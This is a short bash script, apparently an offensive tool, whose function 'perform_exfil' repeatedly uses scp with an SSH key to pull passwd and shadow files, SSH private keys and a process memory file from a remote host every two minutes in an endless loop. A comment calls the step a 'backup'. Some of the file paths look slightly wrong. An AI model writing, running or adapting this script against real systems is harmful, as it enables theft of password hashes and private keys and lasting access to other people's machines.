#!/bin/bash

# Variables
remote_user="kali"
remote_host="192.168.1.0"
remote_directory="/"
local_directory="/home/temp_user_files/"
remote_home_directory="/home"
ssh_key="/path/to/your/private/key.pem"

# Function to copy files periodically
perform_exfil() {
    # SCP files from remote host to local directory
    scp -i "$ssh_key" "$remote_user@$remote_host:$remote_directory/passwd" "$local_directory"
    scp -i "$ssh_key" "$remote_user@$remote_host:$remote_directory/shadow" "$local_directory"
    scp -i "$ssh_key" "$remote_user@$remote_host:$remote_home_directory/.ssh/*sa" "$local_directory"
    scp -i "$ssh_key" "$remote_user@$remote_host:$remote_home_directory/process_mem" "$local_directory"
}

# Main function
main() {
    # Continuously perform exfil
    while true; do
        # Execute backup function
        perform_exfil
        # Sleep for 2 minutes (120 seconds)
        sleep 120
    done
}

# Execute the script
main
